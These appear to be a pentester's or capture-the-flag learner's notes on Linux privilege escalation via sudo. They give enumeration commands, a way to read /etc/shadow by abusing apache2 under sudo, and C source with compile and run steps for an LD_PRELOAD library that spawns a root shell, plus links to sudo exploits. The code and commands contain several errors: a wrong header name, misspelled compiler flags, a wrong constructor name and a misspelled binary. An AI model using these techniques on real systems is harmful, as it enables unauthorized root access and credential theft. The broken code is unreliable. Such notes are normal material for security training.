## Sudo

Allow us to run command as root.

#### Sudo shell Escaping

`sudo -l`
`cat /etc/sudoers`
`sudo -V`
[GTFOBins](https://gtfobins.github.io/)

[Linux PrivEsc playground - tryhackme](https://tryhackme.com/room/privescplayground)

* * *

#### Escalation via Intended Functionality

For example apache and we may not have this GTFOBins but we have sudo. So we search in google for apache "sudo privelege escalation". Then we may get some results. For example `sudo apache2 -f /etc/shadow`.

[wget](https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthrough/)

* * *

#### Escalation via LD_PRELOAD

```C
#include<stdio.h>
#include<sys/type.h>
#include<stdlib.h>

void init()
{
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

`gcc -fPIC -share -o shell.so shell.c -nostartfile`
`sudo LD_PRELOAD=file/path/shell.so apche2`.


#### Examples of exploits

[CMS Made Simple](https://www.exploit-db.com/exploits/46635)
[CVE-2019-14287 Security Bypass](https://www.exploit-db.com/exploits/47502)
[CVE-2019-18634 Github](https://github.com/saleemrashid/sudo-cve-2019-18634)